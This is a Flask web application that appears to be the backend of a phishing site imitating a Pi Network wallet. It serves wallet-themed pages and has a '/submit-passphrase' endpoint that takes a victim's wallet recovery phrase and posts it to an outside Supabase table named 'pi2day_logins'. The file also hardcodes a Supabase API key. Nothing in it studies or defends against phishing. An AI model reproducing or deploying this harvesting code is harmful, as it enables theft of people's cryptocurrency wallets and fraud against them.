from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

SUPABASE_URL = 'https://ixqiadgvovxozexatyta.supabase.co'
SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml4cWlhZGd2b3Z4b3pleGF0eXRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgxNjk5ODcsImV4cCI6MjA2Mzc0NTk4N30.yXPGI9RR_H4N9Ocp4FQGgh4ycDFRz9cfUEkX_PdTJos'

@app.route('/')
def homepage():
    return render_template('homepage.html')

@app.route('/wallet-pinet')
def wallet():
    return render_template('wallet_pinet.html')

@app.route('/submit-passphrase', methods=['POST'])
def submit_passphrase():
    phrase = request.form.get('passphrase')
    if not phrase:
        return jsonify({"error": "No passphrase"}), 400

    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json"
    }

    data = {
        "phrase": phrase
    }

    response = requests.post(
        f"{SUPABASE_URL}/rest/v1/pi2day_logins",
        headers=headers,
        json=data
    )

    if response.status_code == 201:
        return jsonify({"success": True})
    else:
        return jsonify({
            "success": False,
            "status_code": response.status_code,
            "message": response.text
        })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
